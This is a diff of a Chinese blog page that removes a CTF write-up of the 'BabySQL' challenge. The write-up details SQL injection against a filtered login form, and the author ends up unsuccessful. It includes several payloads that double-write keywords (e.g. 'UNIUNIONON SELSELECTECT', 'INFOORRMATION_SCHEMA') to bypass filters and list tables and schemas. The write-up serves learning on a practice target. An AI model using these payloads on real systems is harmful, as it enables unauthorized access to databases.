-<h2 id="极客大挑战-2019-BabySQL1"><a href="#极客大挑战-2019-BabySQL1" class="headerlink" title="[极客大挑战 2019]BabySQL1"></a>[极客大挑战 2019]BabySQL1</h2><p>来到题目,该网站存在严格过滤,是个 SQL 注入的过滤版题型</p>
-<p><img src="/images/YfAdb3J8YoEE01xXdmQcHKRhn3d.png"></p>
-<p>用户名和密码应该分别对应两个变量的值,我们输入用户名和密码试试看</p>
-<p><img src="/images/HVRgbkdRYo15JLxs67wcdQYnnyd.png"></p>
-<p>进不去，提示用户名和密码错误</p>
-<p><img src="/images/IuFcbQMmVoSOkuxq2DFcjtkOn6H.png"></p>
-<p>那试试看错误的语法他会怎么提示,并看看闭合方式.</p>
-<p><img src="/images/T0iQbxRDUo5KkZx4d8mcP1YNnhd.png"></p>
-<p>这么报错,发现是单引号闭合方式</p>
-<p><img src="/images/KHnubCYyZoMLaSxbLOVcQB2XnRe.png"></p>
-<p>我们现在任何回显都没得到,先按照做题顺序来,看看怎样才能让他回显</p>
-<p><img src="/images/NmFibyQutoypA2x34nEcqr3UnId.png"></p>
-<p><img src="/images/PoKkbogq6oQYWMxFDmjc8j8fnXf.png"></p>
-<p>UNION SELECT 加号都不见了,推知全被过滤了,前两个用双写,注释用手动闭合绕过吧</p>
-<p>Payload:密码&#x3D;1’ UNIUNIONON SELSELECTECT 1 AND 1&#x3D;’1</p>
-<p><img src="/images/EMOUbWApeoNq7rxOea4cw36qnSg.png"></p>
-<p>前面都没报错,就这里报错了,可能 AND 也被绕过了,试试另一个绕过注释符的方式</p>
-<p>Payload:密码&#x3D;1’ UNIUNIONON SELSELECTECT 1**’** (在修改密码的同时始终保证用户名是 1)</p>
-<p>用红色单引号手动闭合一下</p>
-<p><img src="/images/FvPfbQxfOomHNdxZzscc4Zh7nQb.png"></p>
-<p>运行通过了,列数不对,用 SELECT1,2 SELECT1,2,3 都试试,发现 SELECT1,2,3 竟然登陆成功了,且回显位是 2 和 3!!</p>
-<p><img src="/images/AGBtbookSofXbdxvPKecVQf9nAp.png"></p>
-<p>2 改成 DATABASE()再看看</p>
-<p><img src="/images/GyV4bKc9SofVQ1xVW8XcpNnZnXb.png"></p>
-<p>好的,正常运行.</p>
-<p>那步骤也正常进行:Payload:</p>
-<p>密码&#x3D;1’ UNIUNIONON SELSELECTECT 1,GROUP_CONCAT(TABLE_NAME),3 FROM INFORMATION_SCHEMA.tables**’**</p>
-<p><img src="/images/TTiEbBQlSoTi14x6G4bcLOEMnpe.png"></p>
-<p>information_schema 全没了,过滤了 and,估计也过滤了 or,用复写形式重试.</p>
-<p>payload:</p>
-<p>密码&#x3D;1’ UNIUNIONON SELSELECTECT 1,GROUP_CONCAT(TABLE_NAME),3 FROM INFOORRMATION_SCHEMA.tables**’**</p>
-<p><img src="/images/ND7Mbrt2Ao1rMaxWGTRcidoQnAc.png"></p>
-<p>还是进不去,估计整个单词都没了,复写一整个单词</p>
-<p>密码&#x3D;1’ UNIUNIONON SELSELECTECT 1,GROUP_CONCAT(TABLE_NAME),3 FROM INFOORRMATION_SCHINFORMATION_SCHEMAEMA.tables**’**</p>
-<p>还是不行,那一个一个试呗,只知道 tables 前面显示不出…</p>
-<p>……</p>
-<p>死活进不去,到网上搜了下攻略,改了一下代码,发现只有这条才能进 database()的表名</p>
-<p>不写 where table_schema&#x2F;写 table_schema&#x3D;database()都报错</p>
-<p>密码&#x3D;1’ UNIUNIONON SELSELECTECT 1,GROUP_CONCAT(TABLE_NAME),3 FRFROMOM INFOORRMATION_SCHEMA.tables whwhereere table_schema&#x3D;’geek’<strong>‘</strong></p>
-<p>这样 geek 中的表名就全显示出来了</p>
-<p><img src="/images/Mv20bYqFIoT27YxXhDdcqpHgnud.png"></p>
-<p>查这两个表,依然没看到 flag,于是查看一下所有的数据库名,看看 flag 在哪个数据库</p>
-<p>1’ ununionion seselectlect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata</p>
-<p>回显了一个名为 ctf 的数据库,再次查询这个数据库,作重复步骤,就得到了 flag 了</p>
-<p><em>(这个靶场不知道是有问题还是咋,后面也一直不给回显(我是正确按照攻略的 payload 操作的),一开始的’’不写 where table_schema&#x2F;写 table_schema&#x3D;database()都报错’’也不知道是靶场错误还是真的过滤了什么东西,总之最后没做出来…)</em></p>
-<h3 id="做题启示-2"><a href="#做题启示-2" class="headerlink" title="做题启示"></a>做题启示</h3><p>1.输用户名和密码的题目,尽量在密码里面注入,不要在用户名,因为后面还有一个密码会造成一些问题</p>
-<p>其他的题目也尽量在最后一个数据注入(一开始对用户名进行 SQL 注入,死活说我 password 有问题…).</p>
-<p>2.查数据库:select 1,2,group_concat(schema_name) from information_schema.schemata</p>
-<p>3.一开始回显不了也莫慌张,没准 UNION SELECT 1,2,3 就回显了</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -3012,7 +2467,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-count">15</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
